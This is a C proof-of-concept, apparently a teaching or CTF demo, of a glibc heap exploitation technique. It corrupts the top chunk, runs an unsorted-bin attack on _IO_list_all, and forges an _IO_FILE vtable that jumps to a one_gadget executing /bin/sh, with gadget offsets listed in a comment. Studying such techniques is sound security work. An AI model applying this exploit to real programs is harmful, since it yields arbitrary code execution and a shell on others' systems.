#include <stdio.h>
#include <stdlib.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stderr,0,2,0);
	setvbuf(stdout,0,2,0);
}

int main()
{
	void *p1,*p2,*p3,*p4;
	long long *ptr;
	long long libc_base=0x7ffff7a0d000;

	setbufs();

	p1=malloc(0x200);
	ptr=(long long)p1+0x200+8;
	*ptr=0xdf1;

	malloc(0x1000);
	p2=malloc(0xd60);

	// now alloc 0x70, 0x60 unsorted bin will be in smallbin list
	ptr=(long long)p2+0xd60+0x10;

	// rewrite the smallbin's bk with _IO_list_all-0x10
	*(ptr+1)=0x7ffff7dd2520-0x10;
	

	// once put the unsortedbin to smallbin
	// _IO_FILE will be rewritten to main_arena
	// so we create a fake _IO_FILE_plus structure
	// at the next _chain, which at the inside of the unsortedbin
	

	*(ptr+2)=0;			// _IO_write_base
	*(ptr+3)=1;			// _IO_write_ptr
	*(ptr+25)=(long long)ptr+0xc0;	// vtable
	*(ptr+27)=libc_base+0x45216;	// write one_gadget to __overflow

	// unsortedbin attach and unsortedbin-to-smallbin
	// so the _IO_FILE is the evil

	puts("watch");
	malloc(0x60);
	
	




	return 0;
}

/*
 
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

*/
